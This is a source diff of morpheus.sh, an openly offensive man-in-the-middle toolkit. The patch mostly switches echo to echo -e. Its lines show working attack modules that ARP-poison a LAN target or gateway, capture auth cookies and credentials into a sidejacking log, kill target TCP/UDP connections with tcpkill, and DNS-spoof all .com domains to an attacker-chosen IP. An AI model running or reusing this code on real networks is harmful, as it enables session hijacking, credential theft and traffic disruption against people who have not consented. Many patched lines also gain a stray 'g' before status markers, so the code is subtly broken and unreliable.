--- src/morpheus/morpheus.sh	2017-01-20 17:15:29.013333337 -0500
+++ morpheus.sh	2017-01-20 17:21:51.130000002 -0500
@@ -86,16 +86,16 @@
     ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
 !
-echo "${RedF}    Morpheus${white}©::${RedF}v$V3R${white}::${RedF}codename${white}::${RedF}oneiroi_phobetor${white}::${RedF}SuspiciousShellActivity${white}©"
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    |${YellowF}Morpheus its a Man-In-The-Middle (mitm) suite that allows users to ${BlueF}|"
-echo "${BlueF}    |${YellowF}manipulate tcp/udp data using ettercap, urlsnarf, msgsnarf, tcpkill${BlueF}|"
-echo "${BlueF}    |${YellowF}as backend applications but... This tool main objective its not to ${BlueF}|"
-echo "${BlueF}    |${YellowF}provide an easy way to exploit/sniff targets, but ratter a call of ${BlueF}|"
-echo "${BlueF}    |${YellowF}attemption to tcp/udp manipulations technics (etter filters).      ${BlueF}|"
-echo "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
+echo -e "${RedF}    Morpheus${white}©::${RedF}v$V3R${white}::${RedF}codename${white}::${RedF}oneiroi_phobetor${white}::${RedF}SuspiciousShellActivity${white}©"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    |${YellowF}Morpheus its a Man-In-The-Middle (mitm) suite that allows users to ${BlueF}|"
+echo -e "${BlueF}    |${YellowF}manipulate tcp/udp data using ettercap, urlsnarf, msgsnarf, tcpkill${BlueF}|"
+echo -e "${BlueF}    |${YellowF}as backend applications but... This tool main objective its not to ${BlueF}|"
+echo -e "${BlueF}    |${YellowF}provide an easy way to exploit/sniff targets, but ratter a call of ${BlueF}|"
+echo -e "${BlueF}    |${YellowF}attemption to tcp/udp manipulations technics (etter filters).      ${BlueF}|"
+echo -e "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
 sleep 1
-echo "${BlueF}    ╘ ${white}Press [${GreenF} ENTER ${white}] to continue${RedF}!"
+echo -e "${BlueF}    ╘ ${white}Press [${GreenF} ENTER ${white}] to continue${RedF}!"
 read OP
 # -----------------------------------------
 # check if user is root
@@ -103,8 +103,8 @@
 # ----------------------------------------
 if [ $(id -u) != "0" ]; then
 echo ""
-echo ${RedF}[☠]${white} we need to be root to run this script...${Reset};
-echo ${RedF}[☠]${white} execute [ sudo ./morpheus.sh ] on terminal ${Reset};
+echo -e ${RedF}g[☠]${white} we need to be root to run this script...${Reset};
+echo -e ${RedF}g[☠]${white} execute [ sudo ./morpheus.sh ] on terminal ${Reset};
 exit
 fi
 
@@ -112,11 +112,11 @@
 apc=`which ettercap`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[☠]${white} ettercap '->' not found! ${Reset};
+echo -e ${RedF}g[☠]${white} ettercap '->' not found! ${Reset};
 sleep 1
-echo ${RedF}[☠]${white} This script requires ettercap to work! ${Reset};
-echo ${RedF}[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
-echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
+echo -e ${RedF}g[☠]${white} This script requires ettercap to work! ${Reset};
+echo -e ${RedF}g[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
+echo -e ${RedF}g[☠]${white} to install missing dependencies... ${Reset};
 exit
 fi
 
@@ -125,11 +125,11 @@
 npm=`which nmap`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[☠]${white} nmap '->' not found! ${Reset};
+echo -e ${RedF}g[☠]${white} nmap '->' not found! ${Reset};
 sleep 1
-echo ${RedF}[☠]${white} This script requires nmap to work! ${Reset};
-echo ${RedF}[☠]${white} Please run: sudo apt-get install nmap ${Reset};
-echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
+echo -e ${RedF}g[☠]${white} This script requires nmap to work! ${Reset};
+echo -e ${RedF}g[☠]${white} Please run: sudo apt-get install nmap ${Reset};
+echo -e ${RedF}g[☠]${white} to install missing dependencies... ${Reset};
 exit
 fi
 
@@ -138,11 +138,11 @@
 npm=`which apache2`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[☠]${white} apache2 '->' not found! ${Reset};
+echo -e ${RedF}g[☠]${white} apache2 '->' not found! ${Reset};
 sleep 1
-echo ${RedF}[☠]${white} This script requires apache2 to work! ${Reset};
-echo ${RedF}[☠]${white} Please run: sudo apt-get install apache ${Reset};
-echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
+echo -e ${RedF}g[☠]${white} This script requires apache2 to work! ${Reset};
+echo -e ${RedF}g[☠]${white} Please run: sudo apt-get install apache ${Reset};
+echo -e ${RedF}g[☠]${white} to install missing dependencies... ${Reset};
 exit
 fi
 
@@ -180,7 +180,7 @@
    exit
     ;;
     \?)
-      echo ${RedF}[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
+      echo -e ${RedF}g[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
       exit
     ;;
   esac
@@ -212,8 +212,8 @@
   cp $IPATH/bin/etter.conf $Econ > /dev/null 2>&1
   sleep 1
 else
-  echo ${RedF}[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
-  echo ${RedF}[x]${white} edit settings File to input path of etter.conf File ${Reset};
+  echo -e ${RedF}g[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
+  echo -e ${RedF}g[x]${white} edit settings File to input path of etter.conf File ${Reset};
   sleep 2
   exit
 fi
@@ -224,7 +224,7 @@
 # ----------------------------------
 trap ctrl_c INT
 ctrl_c() {
-echo "${RedF}[x]${white} CTRL+C abort tasks${RedF}...${Reset}"
+echo -e "${RedF}[x]${white} CTRL+C abort tasks${RedF}...${Reset}"
 # clean logfiles folder at exit
 rm $IPATH/logs/lan.mop > /dev/null 2>&1
 rm $IPATH/output/firewall.ef > /dev/null 2>&1
@@ -259,10 +259,10 @@
 # ----------------------------------------
 sh_stage1 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}This module acts like a firewall report/block/capture_credentials ${BlueF}|"
-echo "${BlueF}    | ${YellowF}    from the selected targets tcp/udp connections (local lan)     ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}This module acts like a firewall report/block/capture_credentials ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}    from the selected targets tcp/udp connections (local lan)     ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -270,15 +270,15 @@
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
   sleep 1
 
-  echo ${BlueF}[☠]${white} Edit firewall.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Edit firewall.eft${RedF}!${Reset};
   sleep 1
 fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
 fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270) > /dev/null 2>&1
@@ -302,7 +302,7 @@
   sleep 1
 
     # compiling firewall.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Compiling firewall.eft${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
     sleep 1
     # port-forward
@@ -310,25 +310,25 @@
     cd $IPATH/logs
 
       # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
         fi
       fi
@@ -340,7 +340,7 @@
   fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -349,7 +349,7 @@
   cd $IPATH
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -364,13 +364,13 @@
 # -------------------------------------------
 sh_stage2 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This module will display port 80(http) and port 443(https)    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
-echo "${BlueF}    | ${YellowF} If any auth cookie its captured And stored in 'sidejacking.log'  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  'Also this module allow users to input a cookie name to filter' ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}    This module will display port 80(http) and port 443(https)    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} If any auth cookie its captured And stored in 'sidejacking.log'  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  'Also this module allow users to input a cookie name to filter' ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -379,16 +379,16 @@
 
 # get user input to build filter
 rm $IPATH/logs/sidejacking.log > /dev/null 2>&1
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
   sleep 1
 
-  echo ${BlueF}[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
   sleep 1
   fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid=\nIf you want to capture all cookies use:Cookie\nInput a cookie name to filter through morpheus." --entry --width 270) > /dev/null 2>&1
@@ -402,7 +402,7 @@
   sleep 1
 
     # compiling packet_drop.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling sidejacking.eft${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Compiling sidejacking.eft${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/sidejacking.eft -o $IPATH/output/sidejacking.ef && sleep 3"
     sleep 1
     # port-forward
@@ -410,25 +410,25 @@
     cd $IPATH/logs
 
       # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost/ /$gateway/
         fi
       fi
@@ -452,7 +452,7 @@
   fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -461,7 +461,7 @@
   cd $IPATH
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -476,12 +476,12 @@
 # -------------------------------------------
 sh_stage3 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}   This module will drop/kill any tcp/udp connections attempted   ${BlueF}|"
-echo "${BlueF}    | ${YellowF}   to/from target, droping packets from source and destination..  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} 'This module uses etter filters and tcpkill to kill connections' ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}   This module will drop/kill any tcp/udp connections attempted   ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}   to/from target, droping packets from source and destination..  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} 'This module uses etter filters and tcpkill to kill connections' ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -490,23 +490,23 @@
 
 ch=`which tcpkill`
 if [ "$ch" != "$TcPkiL" ]; then
-echo ${RedF}[x]${white} tcpkill utility not found${RedF}!${Reset};
+echo -e ${RedF}g[x]${white} tcpkill utility not found${RedF}!${Reset};
 sleep 1
-echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
+echo -e ${RedF}g[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
 sleep 3
 sh_exit
 fi
 
 # get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb > /dev/null 2>&1
   sleep 1
 
-  echo ${BlueF}[☠]${white} Edit packet_drop.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Edit packet_drop.eft${RedF}!${Reset};
   sleep 1
  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
@@ -518,7 +518,7 @@
   sleep 1
 
     # compiling packet_drop.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling packet_drop.eft${RedF}!${Reset};
+    echo -e ${BlueF}g[☠]${white} Compiling packet_drop.eft${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 3"
     sleep 1
     # port-forward
@@ -526,31 +526,31 @@
     cd $IPATH/logs
 
       # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
         fi
       fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -562,7 +562,7 @@
   # sudo pkill tcpkill > /dev/null 2>&1
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -577,23 +577,23 @@
 # -----------------------------------------
 sh_stage4 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}   This module will ask user to input an ip address to redirect   ${BlueF}|"
-echo "${BlueF}    | ${YellowF}     all browser surfing in target to the selected ip address.    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the spoof ip addr'   ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}   This module will ask user to input an ip address to redirect   ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}     all browser surfing in target to the selected ip address.    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the spoof ip addr'   ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
 rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 # get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: 31.192.120.44\nWARNING: next value must be decimal..." --entry --width 270) > /dev/null 2>&1
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
@@ -604,7 +604,7 @@
   sed -i "s|TaRgEt|$fil_one|g" etter.dns # NO dev/null to report file not existence :D
   sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
-  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  echo -e ${BlueF}g[☠]${white} Etter.dns configurated...${Reset};
   # using SED bash command to config redirect.eft
   sed -i "s|IpAdR|$fil_one|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
   cd $IPATH
@@ -612,39 +612,39 @@
 
 # compiling redirect.eft to be used in ettercap
 xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
-echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
+echo -e ${BlueF}g[☠]${white} Compiling redirect.eft${RedF}!${Reset};
 sleep 1
 xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
-echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost/ /$gateway/
         fi
       fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
   rm $IPATH/output/redirect.ef > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
@@ -656,7 +656,7 @@
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -671,22 +671,22 @@
 # -----------------------------------------------
 sh_stage5 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}      This module will redirect target browsing surfing under     ${BlueF}|"
-echo "${BlueF}    | ${YellowF}       mitm attacks to google sphere website (google prank)       ${BlueF}|"
-echo "${BlueF}    | ${YellowF}      'All [.com] domains will be redirected to mrdoob.com'       ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}      This module will redirect target browsing surfing under     ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}       mitm attacks to google sphere website (google prank)       ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}      'All [.com] domains will be redirected to mrdoob.com'       ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
 rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 # get user input to build filter
